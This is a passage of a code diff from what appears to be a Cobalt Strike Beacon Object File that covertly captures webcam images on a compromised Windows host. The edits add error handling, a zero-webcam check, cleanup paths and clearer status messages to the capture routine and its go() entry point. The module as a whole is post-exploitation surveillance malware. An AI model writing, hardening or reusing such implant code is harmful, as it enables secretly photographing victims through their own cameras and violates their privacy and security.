@@ -1058,7 +1058,7 @@ HRESULT CWebcamAccess_BuildListOfDevices(CWebcamAccess* wa)
                     );
                     if (SUCCEEDED(hrName))
                     {
-                        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Device %u: %ls", i, szFriendlyName);
+                        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Using device %u: %ls", i, szFriendlyName);
                         pCoTaskMemFree(szFriendlyName);
                     }
                     else
@@ -1191,15 +1191,20 @@ HRESULT CWebcamAccess_TryMediaType(CWebcamAccess* wa, IMFMediaType* pType)
 
 HRESULT CWebcamAccess_PrepareDevice(CWebcamAccess* wa)
 {
+    HRESULT hr = S_OK;
     //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CWebcamAccess_PrepareDevice() called");
-
+    BeaconPrintf(CALLBACK_OUTPUT,"\n[*] %d webcams detected",wa->m_cam_devices.count);
+    if(wa->m_cam_devices.count == 0){
+        BeaconPrintf(CALLBACK_ERROR,"No webcams detected");
+        return -1;
+    }
     if (wa->m_cam_devices.selection >= wa->m_cam_devices.count)
     {
         //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Invalid camera selection: %u (count: %u)",wa->m_cam_devices.selection, wa->m_cam_devices.count);
         return E_FAIL;
     }
 
-    HRESULT hr = S_OK;
+
     IMFMediaSource* pSource = NULL;
     IMFAttributes* pAttributes = NULL;
     IMFMediaType* pType = NULL;
@@ -1276,7 +1281,7 @@ HRESULT CWebcamAccess_PrepareDevice(CWebcamAccess* wa)
 cleanup:
     if (FAILED(hr))
     {
-        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Preparing device failed, cleaning up");
+        BeaconPrintf(CALLBACK_ERROR, "\nPreparing device failed, cleaning up");
         if (pSource)
         {
             //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Shutting down media source");
@@ -1545,12 +1550,22 @@ void go(char* buff, int len) {
         return;
     }
     
-    pCoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+    if(FAILED(pCoInitializeEx(NULL, COINIT_APARTMENTTHREADED))){
+        return;
+    }
     BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Initializing webcam");
     CWebcamAccess wa;
     CWebcamAccess_Init(&wa);
-    CWebcamAccess_Initialize(&wa);
-    CWebcamAccess_PrepareDevice(&wa);
+
+    if (FAILED(CWebcamAccess_Initialize(&wa))) {
+        CWebcamAccess_Destroy(&wa);
+        return;
+    }
+
+    if (FAILED(CWebcamAccess_PrepareDevice(&wa))) {
+        CWebcamAccess_Destroy(&wa);
+        return;
+    }
 
     unsigned int width, height;
     CWebcamAccess_GetImageSizes(&wa, &width, &height);
@@ -1562,7 +1577,11 @@ void go(char* buff, int len) {
         return;
     }
     BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Capturing image data");
-    CWebcamAccess_GetImageData(&wa, buf + (height - 1) * width * 4, width * -4);
+
+    if(FAILED(CWebcamAccess_GetImageData(&wa, buf + (height - 1) * width * 4, width * -4))){
+        CWebcamAccess_Destroy(&wa);
+        return;
+    }
 
     BITMAPINFO bmi = {0};
     bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
